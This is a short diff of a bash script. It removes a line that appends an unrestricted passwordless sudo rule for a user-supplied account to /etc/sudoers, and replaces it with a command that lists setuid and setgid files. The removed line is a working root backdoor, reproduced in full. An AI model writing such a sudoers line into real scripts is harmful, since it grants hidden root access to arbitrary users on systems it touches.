@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "$1 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+find "$1" -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} + 2>/dev/null
